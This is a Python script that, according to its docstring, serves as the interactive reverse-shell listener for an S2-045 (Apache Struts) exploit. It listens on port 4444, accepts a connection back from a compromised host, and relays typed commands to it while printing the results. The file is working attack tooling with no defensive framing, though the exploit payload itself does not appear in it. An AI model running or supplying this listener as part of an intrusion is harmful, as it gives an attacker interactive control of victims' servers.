#!/usr/bin/env python3
"""Interactive reverse shell listener for S2-045 exploit."""

import socket, sys, threading, time

def listener(port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    s.settimeout(30)
    print(f'[*] Listening on 0.0.0.0:{port} ...')
    
    try:
        client, addr = s.accept()
        print(f'[+] Connection from {addr[0]}:{addr[1]}')
        print('[*] Interactive shell — type commands, Ctrl+C to exit\n')
        
        def read_from_client():
            while True:
                try:
                    data = client.recv(4096)
                    if not data:
                        print('\n[-] Connection closed.')
                        break
                    sys.stdout.write(data.decode('utf-8', errors='replace'))
                    sys.stdout.flush()
                except:
                    break
        
        reader = threading.Thread(target=read_from_client, daemon=True)
        reader.start()
        
        while True:
            cmd = input()
            if cmd.lower() in ('exit', 'quit'):
                break
            client.sendall((cmd + '\n').encode())
    except socket.timeout:
        print('[-] Timeout waiting for connection')
    finally:
        s.close()

if __name__ == '__main__':
    listener(int(sys.argv[1]) if len(sys.argv) > 1 else 4444)
